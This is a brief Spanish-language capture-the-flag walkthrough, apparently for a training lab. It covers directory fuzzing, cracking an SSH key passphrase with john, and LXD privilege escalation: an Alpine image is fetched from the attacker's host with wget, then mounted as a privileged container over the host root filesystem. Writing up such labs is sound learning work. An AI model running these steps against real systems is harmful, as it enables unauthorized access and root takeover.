# NMAP

![alt text](image.png)

# WEB

![alt text](image-1.png)

Posible usuario

![alt text](image-2.png)

# Fuzzing

    gobuster dir -u http://10.10.74.161/ -w /usr/share/wordlists/dirb/common.txt

![alt text](image-3.png)

![alt text](image-4.png)

![alt text](image-5.png)

![alt text](image-6.png)

![alt text](image-7.png)

    ssh2john secretKey > pass.hash  

![alt text](image-8.png)    

    john pass.hash

![alt text](image-9.png)

    chmod 600 secretKey

# SSH

![alt text](image-10.png)

# User Flag

![alt text](image-11.png)

# Escalada de Privilegios

Descargamos (build-alpine)[https://github.com/saghul/lxd-alpine-builder/blob/master/build-alpine]

    sudo bash build-alpine

Obtenemos un `alpine-v3.13-x86_64-20210218_0139.tar.gz`. Iniciamos un servidor en python `sudo python3 -m http.server` y pasamos el archivo

    wget 10.8.67.209:8001/alpine-v3.13-x86_64-20210218_0139.tar.gz

![alt text](image-12.png)

    lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage

    lxc image list

    lxc init alpine privesc -c security.privileged=true
    
![alt text](image-13.png)

    lxc list

    lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

    lxc start privesc

    lxc exec privesc /bin/sh

![alt text](image-14.png)

# Root Flag

    find / -type f -name "root.txt" 2>/dev/null

![alt text](image-15.png)